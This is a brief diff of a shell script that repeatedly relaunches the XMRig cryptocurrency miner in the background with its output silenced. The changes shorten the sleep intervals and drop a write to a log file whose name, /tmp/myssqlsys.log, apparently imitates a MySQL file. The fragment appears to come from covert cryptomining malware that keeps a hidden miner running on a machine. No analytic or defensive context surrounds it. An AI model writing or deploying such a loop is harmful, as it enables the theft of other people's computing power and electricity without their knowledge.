@@ -18,8 +18,7 @@ while true; do
         if [ ! "$server" ]; then
             ./addconf.sh
             /bin/bash ./xmrig.sh --config=./config_background.json >/dev/null 2>&1
-            sleep 40
+            sleep 20
         fi
-        echo " ">/tmp/myssqlsys.log
-        sleep 20
+        sleep 10
 done
